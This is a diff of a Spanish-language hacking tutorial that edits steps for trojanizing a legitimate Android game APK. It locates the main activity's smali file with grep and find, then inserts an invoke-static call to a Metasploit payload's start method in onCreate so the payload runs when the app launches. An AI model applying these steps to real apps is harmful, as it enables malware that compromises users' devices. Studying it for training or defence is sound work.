@@ -139,7 +139,7 @@ Lo primero explicar esto, cuando digo APK maliciosa **"original"**, lo que vamos
     * Entramos ahora en la carpeta de la APK "original" que hemos descargado.
     * Una vez hecho esto debemos de modificar el archivo "TempleRunOzActivity.smali (en mi caso)" de la apk "original" para que apunte a nuestro payload y lo ejecute al arrancar la app.
     * Para poder encontrar la ubicación de este archivo, si no lo encontramos, podemos usar los siguientes comandos (desde la raiz del directorio).
-      * ```grep "MAIN" -b2 AndroidManifest.xml``` => Para buscar la palabra "MAIN" dentro del archivo AndroidManifest.xml y mostrando las 2 líneas que hay por encima.
+      * ```grep "MAIN" -b2 AndroidManifest.xml``` => Para buscar la palabra "MAIN" dentro del archivo AndroidManifest.xml y mostrando las 2 líneas que hay por encima y por debajo.
       * Para conseguir su ruta, tenemos que fijarnos donde dice "android:name=", lo que viene después nos mostrará la ruta que tenemos que seguir hasta el archivo "TempleRunOzActivity.smali (en mi caso)".
       * En el caso que no os aparezca la ruta y solo os aparezca el nombre del fichero, podemos buscarlo con el comando:  
       ```find ./ -type f -name "TempleRunOzActivity".```
@@ -147,10 +147,10 @@ Lo primero explicar esto, cuando digo APK maliciosa **"original"**, lo que vamos
 ![grepManifest](/images/apuntes/HackingAndroid/grepManifest.png)
 
   * Abrimos el archivo "TempleRunOzActivity.smali" y lo modificamos:
-    * Buscamos la línea donde dice ".method public onCreate..."
+    * Buscamos la línea donde dice ".method "*" onCreate..." (* Puede ser public, private, protected... Así que mejor buscar por "onCreate") 
     * En la primera línea debajo de esta que hemos buscado tenemos que colocar una "llamada" a nuestro payload para que se ejecute al arrancar la app.
     * La línea que tenemos que añadir quedaría así:
-      * invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V 
+      * ```invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V```
         * Donde está la primera letra "L" tenemos que poner la ruta donde estaría nuestro payload, partiendo desde el directorio "com".
         * >Toda esta línea la podemos copiar de una línea parecida que hay más abajo y modificar lo que necesitemos, solo para simplificarlo.
 
